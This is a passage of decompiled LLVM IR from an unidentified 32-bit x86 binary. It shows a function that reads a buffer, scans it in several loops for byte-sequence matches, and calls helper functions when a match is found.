  %v0_804e18c = phi i32 [ %v0_804e18c.pre, %dec_label_pc_804e0e6 ], [ %v0_804e18c52, %dec_label_pc_804e297 ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ], [ %v0_804e18c52, %dec_label_pc_804e288 ]
  %v2_804e18c = add i32 %v1_804e18c, -4
  %v3_804e18c = inttoptr i32 %v2_804e18c to i32*
  store i32 %v0_804e18c, i32* %v3_804e18c, align 4
  %v1_804e18d = add i32 %v1_804e18c, -8
  %v2_804e18d = inttoptr i32 %v1_804e18d to i32*
  store i32 4096, i32* %v2_804e18d, align 4
  %v1_804e192 = add i32 %v1_804e18c, 56
  store i32 %v1_804e192, i32* %eax.global-to-local, align 4
  %v2_804e196 = add i32 %v1_804e18c, -12
  %v3_804e196 = inttoptr i32 %v2_804e196 to i32*
  store i32 %v1_804e192, i32* %v3_804e196, align 4
  %v1_804e197 = add i32 %v1_804e18c, 40
  %v2_804e197 = inttoptr i32 %v1_804e197 to i32*
  %v3_804e197 = load i32, i32* %v2_804e197, align 4
  store i32 %v3_804e197, i32* %eax.global-to-local, align 4
  %v2_804e19b = add i32 %v1_804e18c, -16
  %v3_804e19b = inttoptr i32 %v2_804e19b to i32*
  store i32 %v3_804e197, i32* %v3_804e19b, align 4
  %v5_804e19c = call i32 @function_805238c(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e19c, i32* %eax.global-to-local, align 4
  %v0_804e1a1 = load i32, i32* @esp, align 4
  store i32 %v5_804e19c, i32* @ebx, align 4
  %tmp114 = icmp slt i32 %v5_804e19c, 1
  br i1 %tmp114, label %dec_label_pc_804e397, label %dec_label_pc_804e1ae

dec_label_pc_804e1ae:                             ; preds = %dec_label_pc_804e18c
  %v1_804e1a1 = add i32 %v0_804e1a1, 16
  %v1_804e1ae = add i32 %v0_804e1a1, 8436
  %v2_804e1ae = inttoptr i32 %v1_804e1ae to i32*
  %v3_804e1ae = load i32, i32* %v2_804e1ae, align 4
  store i32 %v3_804e1ae, i32* %eax.global-to-local, align 4
  %v2_804e1b5 = inttoptr i32 %v1_804e1a1 to i32*
  store i32 %v3_804e1ae, i32* %v2_804e1b5, align 4
  %v0_804e1b8 = load i32, i32* @ebx, align 4
  %v1_804e1b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1b8 = sub i32 %v0_804e1b8, %v1_804e1b8
  %v8_804e1b8 = xor i32 %v1_804e1b8, %v0_804e1b8
  %v9_804e1b8 = xor i32 %v2_804e1b8, %v0_804e1b8
  %v10_804e1b8 = and i32 %v9_804e1b8, %v8_804e1b8
  %v11_804e1b8 = icmp slt i32 %v10_804e1b8, 0
  %v13_804e1b8 = icmp slt i32 %v2_804e1b8, 0
  %v2_804e1ba = icmp eq i1 %v13_804e1b8, %v11_804e1b8
  br i1 %v2_804e1ba, label %dec_label_pc_804e1bc, label %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge

dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge: ; preds = %dec_label_pc_804e1ae
  %v0_804e1e8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e1e8

dec_label_pc_804e1bc:                             ; preds = %dec_label_pc_804e1ae
  %v0_804e1c1 = load i32, i32* @esp, align 4
  %v10_804e1c5 = icmp eq i32 %v0_804e1b8, 0
  br i1 %v10_804e1c5, label %dec_label_pc_804e1e8, label %dec_label_pc_804e1d0.preheader

dec_label_pc_804e1d0.preheader:                   ; preds = %dec_label_pc_804e1bc
  %v1_804e1c1 = add i32 %v0_804e1c1, 56
  %v1_804e1d0 = add i32 %v0_804e1c1, 36
  %v2_804e1d0 = inttoptr i32 %v1_804e1d0 to i32*
  %v1_804e2c1 = inttoptr i32 %v0_804e1c1 to i32*
  br label %dec_label_pc_804e1d0

dec_label_pc_804e1d0:                             ; preds = %dec_label_pc_804e1d0.preheader, %dec_label_pc_804e1e1
  %v0_804e1e1.in = phi i32 [ %v0_804e1e1, %dec_label_pc_804e1e1 ], [ %v0_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e2c0 = phi i32 [ %v3_804e1d661, %dec_label_pc_804e1e1 ], [ 0, %dec_label_pc_804e1d0.preheader ]
  %v4_804e1d4 = phi i32 [ %v6_804e1d4, %dec_label_pc_804e1e1 ], [ %v1_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e2 = phi i32 [ %v1_804e1e2, %dec_label_pc_804e1e1 ], [ %v1_804e1c1, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e1 = add i32 %v0_804e1e1.in, -1
  %v3_804e1d0 = load i32, i32* %v2_804e1d0, align 4
  store i32 %v3_804e1d0, i32* @edi, align 4
  %v1_804e1d4 = inttoptr i32 %v0_804e1e2 to i8*
  %v2_804e1d4 = load i8, i8* %v1_804e1d4, align 1
  %v3_804e1d4 = zext i8 %v2_804e1d4 to i32
  %v5_804e1d4 = and i32 %v4_804e1d4, -256
  %v6_804e1d4 = or i32 %v3_804e1d4, %v5_804e1d4
  store i32 %v6_804e1d4, i32* %eax.global-to-local, align 4
  %v4_804e1d6 = add i32 %v3_804e1d0, %v0_804e2c0
  %v5_804e1d6 = inttoptr i32 %v4_804e1d6 to i8*
  %v6_804e1d6 = load i8, i8* %v5_804e1d6, align 1
  %v17_804e1d6 = icmp eq i8 %v2_804e1d4, %v6_804e1d6
  br i1 %v17_804e1d6, label %dec_label_pc_804e2c0, label %dec_label_pc_804e1df

dec_label_pc_804e1df:                             ; preds = %dec_label_pc_804e1d0
  br label %dec_label_pc_804e1e1

dec_label_pc_804e1e1:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e1df
  %v3_804e1d661 = phi i32 [ %v1_804e2c0, %dec_label_pc_804e2c0 ], [ 0, %dec_label_pc_804e1df ]
  %v1_804e1e2 = add i32 %v0_804e1e2, 1
  %v10_804e1e3 = icmp eq i32 %v0_804e1e1, 0
  %v1_804e1e6 = icmp eq i1 %v10_804e1e3, false
  br i1 %v1_804e1e6, label %dec_label_pc_804e1d0, label %dec_label_pc_804e1e8

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1e1, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge, %dec_label_pc_804e1bc
  %v0_804e1e8 = phi i32 [ %v0_804e1e8.pre, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge ], [ %v0_804e1c1, %dec_label_pc_804e1bc ], [ %v0_804e1c1, %dec_label_pc_804e1e1 ]
  %v1_804e1e8 = add i32 %v0_804e1e8, 8416
  %v2_804e1e8 = inttoptr i32 %v1_804e1e8 to i32*
  %v3_804e1e8 = load i32, i32* %v2_804e1e8, align 4
  store i32 %v3_804e1e8, i32* %eax.global-to-local, align 4
  %v2_804e1ef = inttoptr i32 %v0_804e1e8 to i32*
  store i32 %v3_804e1e8, i32* %v2_804e1ef, align 4
  %v0_804e1f2 = load i32, i32* @ebx, align 4
  %v1_804e1f2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1f2 = sub i32 %v0_804e1f2, %v1_804e1f2
  %v8_804e1f2 = xor i32 %v1_804e1f2, %v0_804e1f2
  %v9_804e1f2 = xor i32 %v2_804e1f2, %v0_804e1f2
  %v10_804e1f2 = and i32 %v9_804e1f2, %v8_804e1f2
  %v11_804e1f2 = icmp slt i32 %v10_804e1f2, 0
  %v13_804e1f2 = icmp slt i32 %v2_804e1f2, 0
  %v2_804e1f4 = icmp eq i1 %v13_804e1f2, %v11_804e1f2
  br i1 %v2_804e1f4, label %dec_label_pc_804e1f6, label %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge

dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge: ; preds = %dec_label_pc_804e1e8
  %v0_804e21c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e21c

dec_label_pc_804e1f6:                             ; preds = %dec_label_pc_804e1e8
  %v0_804e1fb = load i32, i32* @esp, align 4
  %v10_804e1ff = icmp eq i32 %v0_804e1f2, 0
  br i1 %v10_804e1ff, label %dec_label_pc_804e21c, label %dec_label_pc_804e204.preheader

dec_label_pc_804e204.preheader:                   ; preds = %dec_label_pc_804e1f6
  %v1_804e1fb = add i32 %v0_804e1fb, 56
  %v1_804e204 = add i32 %v0_804e1fb, 32
  %v2_804e204 = inttoptr i32 %v1_804e204 to i32*
  %v1_804e359 = inttoptr i32 %v0_804e1fb to i32*
  br label %dec_label_pc_804e204

dec_label_pc_804e204:                             ; preds = %dec_label_pc_804e204.preheader, %dec_label_pc_804e216
  %v0_804e216.in = phi i32 [ %v0_804e216, %dec_label_pc_804e216 ], [ %v0_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e358 = phi i32 [ %v3_804e20a69, %dec_label_pc_804e216 ], [ 0, %dec_label_pc_804e204.preheader ]
  %v4_804e208 = phi i32 [ %v6_804e208, %dec_label_pc_804e216 ], [ %v1_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e362 = phi i32 [ %v1_804e215, %dec_label_pc_804e216 ], [ %v1_804e1fb, %dec_label_pc_804e204.preheader ]
  %v0_804e216 = add i32 %v0_804e216.in, -1
  %v3_804e204 = load i32, i32* %v2_804e204, align 4
  store i32 %v3_804e204, i32* @edi, align 4
  %v1_804e208 = inttoptr i32 %v0_804e362 to i8*
  %v2_804e208 = load i8, i8* %v1_804e208, align 1
  %v3_804e208 = zext i8 %v2_804e208 to i32
  %v5_804e208 = and i32 %v4_804e208, -256
  %v6_804e208 = or i32 %v3_804e208, %v5_804e208
  store i32 %v6_804e208, i32* %eax.global-to-local, align 4
  %v4_804e20a = add i32 %v3_804e204, %v0_804e358
  %v5_804e20a = inttoptr i32 %v4_804e20a to i8*
  %v6_804e20a = load i8, i8* %v5_804e20a, align 1
  %v17_804e20a = icmp eq i8 %v2_804e208, %v6_804e20a
  br i1 %v17_804e20a, label %dec_label_pc_804e358, label %dec_label_pc_804e213

dec_label_pc_804e213:                             ; preds = %dec_label_pc_804e204
  br label %dec_label_pc_804e216

dec_label_pc_804e216:                             ; preds = %dec_label_pc_804e358, %dec_label_pc_804e213
  %v3_804e20a69 = phi i32 [ 0, %dec_label_pc_804e213 ], [ %v1_804e358, %dec_label_pc_804e358 ]
  %v1_804e215 = add i32 %v0_804e362, 1
  %v10_804e217 = icmp eq i32 %v0_804e216, 0
  %v1_804e21a = icmp eq i1 %v10_804e217, false
  br i1 %v1_804e21a, label %dec_label_pc_804e204, label %dec_label_pc_804e21c

dec_label_pc_804e21c:                             ; preds = %dec_label_pc_804e216, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge, %dec_label_pc_804e1f6
  %v0_804e21c = phi i32 [ %v0_804e21c.pre, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge ], [ %v0_804e1fb, %dec_label_pc_804e1f6 ], [ %v0_804e1fb, %dec_label_pc_804e216 ]
  %v1_804e21c = add i32 %v0_804e21c, 8412
  %v2_804e21c = inttoptr i32 %v1_804e21c to i32*
  %v3_804e21c = load i32, i32* %v2_804e21c, align 4
  store i32 %v3_804e21c, i32* %eax.global-to-local, align 4
  %v2_804e223 = inttoptr i32 %v0_804e21c to i32*
  store i32 %v3_804e21c, i32* %v2_804e223, align 4
  %v0_804e226 = load i32, i32* @ebx, align 4
  %v1_804e226 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e226 = sub i32 %v0_804e226, %v1_804e226
  %v8_804e226 = xor i32 %v1_804e226, %v0_804e226
  %v9_804e226 = xor i32 %v2_804e226, %v0_804e226
  %v10_804e226 = and i32 %v9_804e226, %v8_804e226
  %v11_804e226 = icmp slt i32 %v10_804e226, 0
  %v13_804e226 = icmp slt i32 %v2_804e226, 0
  %v2_804e228 = icmp eq i1 %v13_804e226, %v11_804e226
  br i1 %v2_804e228, label %dec_label_pc_804e22a, label %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge

dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge: ; preds = %dec_label_pc_804e21c
  %v0_804e250.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e250

dec_label_pc_804e22a:                             ; preds = %dec_label_pc_804e21c
  %v0_804e22f = load i32, i32* @esp, align 4
  %v10_804e233 = icmp eq i32 %v0_804e226, 0
  br i1 %v10_804e233, label %dec_label_pc_804e250, label %dec_label_pc_804e238.preheader

dec_label_pc_804e238.preheader:                   ; preds = %dec_label_pc_804e22a
  %v1_804e22f = add i32 %v0_804e22f, 56
  %v1_804e238 = add i32 %v0_804e22f, 28
  %v2_804e238 = inttoptr i32 %v1_804e238 to i32*
  %v1_804e369 = inttoptr i32 %v0_804e22f to i32*
  br label %dec_label_pc_804e238

dec_label_pc_804e238:                             ; preds = %dec_label_pc_804e238.preheader, %dec_label_pc_804e24a
  %v0_804e24a.in = phi i32 [ %v0_804e24a, %dec_label_pc_804e24a ], [ %v0_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e368 = phi i32 [ %v3_804e23e77, %dec_label_pc_804e24a ], [ 0, %dec_label_pc_804e238.preheader ]
  %v4_804e23c = phi i32 [ %v6_804e23c, %dec_label_pc_804e24a ], [ %v1_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e372 = phi i32 [ %v1_804e249, %dec_label_pc_804e24a ], [ %v1_804e22f, %dec_label_pc_804e238.preheader ]
  %v0_804e24a = add i32 %v0_804e24a.in, -1
  %v3_804e238 = load i32, i32* %v2_804e238, align 4
  store i32 %v3_804e238, i32* @edi, align 4
  %v1_804e23c = inttoptr i32 %v0_804e372 to i8*
  %v2_804e23c = load i8, i8* %v1_804e23c, align 1
  %v3_804e23c = zext i8 %v2_804e23c to i32
  %v5_804e23c = and i32 %v4_804e23c, -256
  %v6_804e23c = or i32 %v3_804e23c, %v5_804e23c
  store i32 %v6_804e23c, i32* %eax.global-to-local, align 4
  %v4_804e23e = add i32 %v3_804e238, %v0_804e368
  %v5_804e23e = inttoptr i32 %v4_804e23e to i8*
  %v6_804e23e = load i8, i8* %v5_804e23e, align 1
  %v17_804e23e = icmp eq i8 %v2_804e23c, %v6_804e23e
  br i1 %v17_804e23e, label %dec_label_pc_804e368, label %dec_label_pc_804e247

dec_label_pc_804e247:                             ; preds = %dec_label_pc_804e238
  br label %dec_label_pc_804e24a

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e368, %dec_label_pc_804e247
  %v3_804e23e77 = phi i32 [ 0, %dec_label_pc_804e247 ], [ %v1_804e368, %dec_label_pc_804e368 ]
  %v1_804e249 = add i32 %v0_804e372, 1
  %v10_804e24b = icmp eq i32 %v0_804e24a, 0
  %v1_804e24e = icmp eq i1 %v10_804e24b, false
  br i1 %v1_804e24e, label %dec_label_pc_804e238, label %dec_label_pc_804e250

dec_label_pc_804e250:                             ; preds = %dec_label_pc_804e24a, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge, %dec_label_pc_804e22a
  %v0_804e250 = phi i32 [ %v0_804e250.pre, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge ], [ %v0_804e22f, %dec_label_pc_804e22a ], [ %v0_804e22f, %dec_label_pc_804e24a ]
  %v1_804e250 = add i32 %v0_804e250, 8424
  %v2_804e250 = inttoptr i32 %v1_804e250 to i32*
  %v3_804e250 = load i32, i32* %v2_804e250, align 4
  store i32 %v3_804e250, i32* %eax.global-to-local, align 4
  %v2_804e257 = inttoptr i32 %v0_804e250 to i32*
  store i32 %v3_804e250, i32* %v2_804e257, align 4
  %v0_804e25a = load i32, i32* @ebx, align 4
  %v1_804e25a = load i32, i32* %eax.global-to-local, align 4
  %v2_804e25a = sub i32 %v0_804e25a, %v1_804e25a
  %v8_804e25a = xor i32 %v1_804e25a, %v0_804e25a
  %v9_804e25a = xor i32 %v2_804e25a, %v0_804e25a
  %v10_804e25a = and i32 %v9_804e25a, %v8_804e25a
  %v11_804e25a = icmp slt i32 %v10_804e25a, 0
  %v13_804e25a = icmp slt i32 %v2_804e25a, 0
  %v2_804e25c = icmp eq i1 %v13_804e25a, %v11_804e25a
  br i1 %v2_804e25c, label %dec_label_pc_804e25e, label %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge

dec_label_pc_804e250.dec_label_pc_804e288_crit_edge: ; preds = %dec_label_pc_804e250
  %v0_804e288.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e288

dec_label_pc_804e25e:                             ; preds = %dec_label_pc_804e250
  %v0_804e263 = load i32, i32* @esp, align 4
  %v10_804e267 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e267, label %dec_label_pc_804e288, label %dec_label_pc_804e270.preheader

dec_label_pc_804e270.preheader:                   ; preds = %dec_label_pc_804e25e
  %v1_804e263 = add i32 %v0_804e263, 56
  %v1_804e270 = add i32 %v0_804e263, 24
  %v2_804e270 = inttoptr i32 %v1_804e270 to i32*
  %v1_804e379 = inttoptr i32 %v0_804e263 to i32*
  br label %dec_label_pc_804e270

dec_label_pc_804e270:                             ; preds = %dec_label_pc_804e270.preheader, %dec_label_pc_804e282
  %v0_804e282.in = phi i32 [ %v0_804e282, %dec_label_pc_804e282 ], [ %v0_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e378 = phi i32 [ %v3_804e27685, %dec_label_pc_804e282 ], [ 0, %dec_label_pc_804e270.preheader ]
  %v4_804e274 = phi i32 [ %v6_804e274, %dec_label_pc_804e282 ], [ %v1_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e382 = phi i32 [ %v1_804e281, %dec_label_pc_804e282 ], [ %v1_804e263, %dec_label_pc_804e270.preheader ]
  %v0_804e282 = add i32 %v0_804e282.in, -1
  %v3_804e270 = load i32, i32* %v2_804e270, align 4
  store i32 %v3_804e270, i32* @edi, align 4
  %v1_804e274 = inttoptr i32 %v0_804e382 to i8*
  %v2_804e274 = load i8, i8* %v1_804e274, align 1
  %v3_804e274 = zext i8 %v2_804e274 to i32
  %v5_804e274 = and i32 %v4_804e274, -256
  %v6_804e274 = or i32 %v3_804e274, %v5_804e274
  store i32 %v6_804e274, i32* %eax.global-to-local, align 4
  %v4_804e276 = add i32 %v3_804e270, %v0_804e378
  %v5_804e276 = inttoptr i32 %v4_804e276 to i8*
  %v6_804e276 = load i8, i8* %v5_804e276, align 1
  %v17_804e276 = icmp eq i8 %v2_804e274, %v6_804e276
  br i1 %v17_804e276, label %dec_label_pc_804e378, label %dec_label_pc_804e27f

dec_label_pc_804e27f:                             ; preds = %dec_label_pc_804e270
  br label %dec_label_pc_804e282

dec_label_pc_804e282:                             ; preds = %dec_label_pc_804e378, %dec_label_pc_804e27f
  %v3_804e27685 = phi i32 [ 0, %dec_label_pc_804e27f ], [ %v1_804e378, %dec_label_pc_804e378 ]
  %v1_804e281 = add i32 %v0_804e382, 1
  %v10_804e283 = icmp eq i32 %v0_804e282, 0
  %v1_804e286 = icmp eq i1 %v10_804e283, false
  br i1 %v1_804e286, label %dec_label_pc_804e270, label %dec_label_pc_804e288

dec_label_pc_804e288:                             ; preds = %dec_label_pc_804e282, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge, %dec_label_pc_804e25e
  %v0_804e297 = phi i32 [ %v0_804e288.pre, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v0_804e263, %dec_label_pc_804e25e ], [ %v0_804e263, %dec_label_pc_804e282 ]
  %v0_804e18c52 = phi i32 [ %v1_804e25a, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v1_804e25a, %dec_label_pc_804e25e ], [ %v6_804e274, %dec_label_pc_804e282 ]
  %v1_804e288 = add i32 %v0_804e297, 8408
  %v2_804e288 = inttoptr i32 %v1_804e288 to i32*
  %v3_804e288 = load i32, i32* %v2_804e288, align 4
  %v2_804e28f = sub i32 %v0_804e25a, %v3_804e288
  %v8_804e28f = xor i32 %v3_804e288, %v0_804e25a
  %v9_804e28f = xor i32 %v2_804e28f, %v0_804e25a
  %v10_804e28f = and i32 %v9_804e28f, %v8_804e28f
  %v11_804e28f = icmp slt i32 %v10_804e28f, 0
  %v13_804e28f = icmp slt i32 %v2_804e28f, 0
  %v2_804e291 = icmp eq i1 %v13_804e28f, %v11_804e28f
  br i1 %v2_804e291, label %dec_label_pc_804e297, label %dec_label_pc_804e18c

dec_label_pc_804e297:                             ; preds = %dec_label_pc_804e288
  %v1_804e2a0126 = add i32 %v0_804e25a, -1
  store i32 %v1_804e2a0126, i32* @ebx, align 4
  %v10_804e2a1127 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e2a1127, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa.lr.ph

dec_label_pc_804e2aa.lr.ph:                       ; preds = %dec_label_pc_804e297
  %v1_804e297 = add i32 %v0_804e297, 56
  %v1_804e2aa = add i32 %v0_804e297, 20
  %v2_804e2aa = inttoptr i32 %v1_804e2aa to i32*
  br label %dec_label_pc_804e2aa

dec_label_pc_804e2aa:                             ; preds = %dec_label_pc_804e2aa.lr.ph, %dec_label_pc_804e2a0.backedge
  %v1_804e2a0131 = phi i32 [ %v1_804e2a0126, %dec_label_pc_804e2aa.lr.ph ], [ %v1_804e2a0, %dec_label_pc_804e2a0.backedge ]
  %v4_804e2ae130 = phi i32 [ %v0_804e18c52, %dec_label_pc_804e2aa.lr.ph ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ]
  %v0_804e391129 = phi i32 [ %v1_804e297, %dec_label_pc_804e2aa.lr.ph ], [ %storemerge32.in, %dec_label_pc_804e2a0.backedge ]
  %v0_804e388128 = phi i32 [ 0, %dec_label_pc_804e2aa.lr.ph ], [ %v3_804e2b091, %dec_label_pc_804e2a0.backedge ]
  %v3_804e2aa = load i32, i32* %v2_804e2aa, align 4
  store i32 %v3_804e2aa, i32* @edi, align 4
  %v1_804e2ae = inttoptr i32 %v0_804e391129 to i8*
  %v2_804e2ae = load i8, i8* %v1_804e2ae, align 1
  %v3_804e2ae = zext i8 %v2_804e2ae to i32
  %v5_804e2ae = and i32 %v4_804e2ae130, -256
  %v6_804e2ae = or i32 %v3_804e2ae, %v5_804e2ae
  store i32 %v6_804e2ae, i32* %eax.global-to-local, align 4
  %v4_804e2b0 = add i32 %v3_804e2aa, %v0_804e388128
  %v5_804e2b0 = inttoptr i32 %v4_804e2b0 to i8*
  %v6_804e2b0 = load i8, i8* %v5_804e2b0, align 1
  %v17_804e2b0 = icmp eq i8 %v2_804e2ae, %v6_804e2b0
  br i1 %v17_804e2b0, label %dec_label_pc_804e388, label %dec_label_pc_804e2b9

dec_label_pc_804e2b9:                             ; preds = %dec_label_pc_804e2aa
  br label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2c0:                             ; preds = %dec_label_pc_804e1d0
  %v1_804e2c0 = add i32 %v0_804e2c0, 1
  %v2_804e2c1 = load i32, i32* %v1_804e2c1, align 4
  %v14_804e2c1 = icmp eq i32 %v2_804e2c1, %v1_804e2c0
  %v1_804e2c4 = icmp eq i1 %v14_804e2c1, false
  br i1 %v1_804e2c4, label %dec_label_pc_804e1e1, label %dec_label_pc_804e2ca

dec_label_pc_804e2ca:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e358, %dec_label_pc_804e368, %dec_label_pc_804e378, %dec_label_pc_804e388
  %v0_804e2ca = phi i32 [ %v0_804e297, %dec_label_pc_804e388 ], [ %v0_804e263, %dec_label_pc_804e378 ], [ %v0_804e22f, %dec_label_pc_804e368 ], [ %v0_804e1fb, %dec_label_pc_804e358 ], [ %v0_804e1c1, %dec_label_pc_804e2c0 ]
  %v1_804e2cd = add i32 %v0_804e2ca, -16
  %v2_804e2cd = inttoptr i32 %v1_804e2cd to i32*
  store i32 12, i32* %v2_804e2cd, align 4
  %v2_804e2cf = call i32 @function_8051280(i8 0)
  store i32 %v2_804e2cf, i32* %eax.global-to-local, align 4
  %v0_804e2d4 = load i32, i32* @esp, align 4
  %v1_804e2d4 = inttoptr i32 %v0_804e2d4 to i32*
  store i32 13, i32* %v1_804e2d4, align 4
  %v2_804e2db = call i32 @function_8051280(i8 0)
  store i32 %v2_804e2db, i32* %eax.global-to-local, align 4
  %v0_804e2e0 = load i32, i32* @esp, align 4
  %v1_804e2e0 = inttoptr i32 %v0_804e2e0 to i32*
  store i32 14, i32* %v1_804e2e0, align 4
  %v2_804e2e7 = call i32 @function_8051280(i8 0)
  store i32 %v2_804e2e7, i32* %eax.global-to-local, align 4
  %v0_804e2ec = load i32, i32* @esp, align 4
  %v1_804e2ec = inttoptr i32 %v0_804e2ec to i32*
  store i32 15, i32* %v1_804e2ec, align 4
  %v2_804e2f3 = call i32 @function_8051280(i8 0)
  store i32 %v2_804e2f3, i32* %eax.global-to-local, align 4
  %v0_804e2f8 = load i32, i32* @esp, align 4
  %v1_804e2f8 = inttoptr i32 %v0_804e2f8 to i32*
  store i32 16, i32* %v1_804e2f8, align 4
  %v2_804e2ff = call i32 @function_8051280(i8 0)
  store i32 %v2_804e2ff, i32* %eax.global-to-local, align 4
  %v0_804e304 = load i32, i32* @esp, align 4
  %v1_804e304 = inttoptr i32 %v0_804e304 to i32*
  %v2_804e304 = load i32, i32* %v1_804e304, align 4
  store i32 %v2_804e304, i32* %eax.global-to-local, align 4
  %v1_804e305 = add i32 %v0_804e304, 56
  %v2_804e305 = inttoptr i32 %v1_804e305 to i32*
  %v3_804e305 = load i32, i32* %v2_804e305, align 4
  store i32 %v3_804e305, i32* @edi, align 4
  store i32 %v3_804e305, i32* %v1_804e304, align 4
  %v1_804e30a = call i32 @function_80521f1(i32 0)
  store i32 %v1_804e30a, i32* %eax.global-to-local, align 4
  %v0_804e30f = load i32, i32* @esp, align 4
  %v1_804e30f = inttoptr i32 %v0_804e30f to i32*
  %v2_804e30f = load i32, i32* %v1_804e30f, align 4
  store i32 %v2_804e30f, i32* @ebx, align 4
  %v3_804e30f = add i32 %v0_804e30f, 4
  %v1_804e310 = inttoptr i32 %v3_804e30f to i32*
  store i32 9, i32* %v1_804e310, align 4
  %v0_804e313 = load i32, i32* @ebp, align 4
  store i32 %v0_804e313, i32* %v1_804e30f, align 4
  %v4_804e314 = call i32 @function_80522d0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e314, i32* @eax, align 4
  %v0_804e319 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e0c7, %dec_label_pc_804e397, %dec_label_pc_804e2ca
  %v1_804e31c.in = phi i32 [ %v0_804e0dc, %dec_label_pc_804e0c7 ], [ %v0_804e3dc, %dec_label_pc_804e397 ], [ %v0_804e319, %dec_label_pc_804e2ca ]
  %v0_804e31c = load i32, i32* @ecx, align 4
  %v2_804e31c = add i32 %v1_804e31c.in, 12
  %v3_804e31c = inttoptr i32 %v2_804e31c to i32*
  store i32 %v0_804e31c, i32* %v3_804e31c, align 4
  %v0_804e31d = load i32, i32* @ecx, align 4
  %v2_804e31d = add i32 %v1_804e31c.in, 8
  %v3_804e31d = inttoptr i32 %v2_804e31d to i32*
  store i32 %v0_804e31d, i32* %v3_804e31d, align 4
  %v1_804e31e = add i32 %v1_804e31c.in, 4
  %v2_804e31e = inttoptr i32 %v1_804e31e to i32*
  store i32 64, i32* %v2_804e31e, align 4
  %v0_804e320 = load i32, i32* @ebp, align 4
  store i32 %v0_804e320, i32* @esi, align 4
  %v1_804e322 = add i32 %v1_804e31c.in, 8328
  store i32 %v1_804e322, i32* @edi, align 4
  %v3_804e329 = inttoptr i32 %v1_804e31c.in to i32*
  store i32 %v1_804e322, i32* %v3_804e329, align 4
  %v2_804e32a = call i32 @function_8051ce0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e32a, i32* %eax.global-to-local, align 4
  %v0_804e32f = load i32, i32* @esp, align 4
  %v1_804e32f = inttoptr i32 %v0_804e32f to i32*
  %v2_804e32f = load i32, i32* %v1_804e32f, align 4
  store i32 %v2_804e32f, i32* %eax.global-to-local, align 4
  %v3_804e32f = add i32 %v0_804e32f, 4
  %v1_804e330 = inttoptr i32 %v3_804e32f to i32*
  store i32 64, i32* %v1_804e330, align 4
  %v1_804e333 = add i32 %v0_804e32f, 8264
  store i32 %v1_804e333, i32* @eax, align 4
  store i32 %v1_804e333, i32* %v1_804e32f, align 4
  %v2_804e33b = call i32 @function_8051ce0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e33b, i32* %eax.global-to-local, align 4
  %v0_804e340 = load i32, i32* @esp, align 4
  %v1_804e340 = inttoptr i32 %v0_804e340 to i32*
  store i32 1, i32* %v1_804e340, align 4
  %v1_804e347 = call i32 @function_8053da0(i32 0)
  store i32 %v1_804e347, i32* %eax.global-to-local, align 4
  %v0_804e34c = load i32, i32* @esp, align 4
  %v1_804e34c = add i32 %v0_804e34c, 24
  %v2_804e34c = inttoptr i32 %v1_804e34c to i32*
  %v3_804e34c = load i32, i32* %v2_804e34c, align 4
  store i32 %v3_804e34c, i32* @ebx, align 4
  %v1_804e350 = add i32 %v0_804e34c, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e358:                             ; preds = %dec_label_pc_804e204
  %v1_804e358 = add i32 %v0_804e358, 1
  %v2_804e359 = load i32, i32* %v1_804e359, align 4
  %v14_804e359 = icmp eq i32 %v2_804e359, %v1_804e358
  br i1 %v14_804e359, label %dec_label_pc_804e2ca, label %dec_label_pc_804e216

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e238
  %v1_804e368 = add i32 %v0_804e368, 1
  %v2_804e369 = load i32, i32* %v1_804e369, align 4
